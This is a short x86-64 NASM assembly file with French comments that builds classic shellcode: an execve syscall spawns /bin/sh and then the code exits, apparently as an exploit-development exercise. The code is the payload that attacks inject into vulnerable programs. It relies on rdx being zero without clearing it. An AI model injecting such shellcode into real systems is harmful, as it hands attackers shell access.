; nasm -f elf64 binsh_shellcode && ld binsh_shellcode.o -o binssh
BITS 64

global _start

section .text
_start:
    push 0x3b ; mov rax, 59 syscall_execve
    pop rax ; mov rax, 59

    mov r8, 0x68732f6e69622f2f ; //bin/sh en little endian sans 0x0 devant car on fais le decalage avec shr
    shr r8, 0x8 ; on fais un decalage de 8 bits ce qui rajoute le \0 a la fin
    push r8
    mov rdi,rsp
    push rdx
    push rdi
    mov rsi,rsp
    syscall
    jmp _exit ; on appel exit

_exit:
    push 0x3c
    pop rax
    xor rdi,rdi ; mov rdi, 0x0
    syscall